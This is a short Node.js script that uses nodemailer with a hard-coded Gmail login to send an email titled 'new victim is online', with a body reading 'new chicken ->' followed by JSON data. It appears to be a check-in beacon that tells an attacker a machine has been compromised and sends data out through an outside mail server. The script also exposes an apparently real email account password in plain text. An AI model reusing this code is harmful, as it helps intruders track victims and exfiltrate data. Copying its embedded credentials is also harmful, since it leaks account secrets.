var http = require('http');
var mailer = require('nodemailer');

var transporter = mailer.createTransport("SMTP", {
    service:"Gmail",
    auth: {
        user: 'overkazaf@gmail.com',
        pass: 'overkazaf89)!!&'
    }
});


var json = {
	test : 'hello'
};

var mail = {
	from : 'overkazaf@gmail.com',
    to: '87935213@qq.com',
    subject: 'new victim is online',
    text: 'new chicken - >' + JSON.stringify(json)
};
transporter.sendMail(mail, function(error, response){
   if(error){
       console.log(error);
   }else{
       console.log("Message sent: " + response.message);
   }
});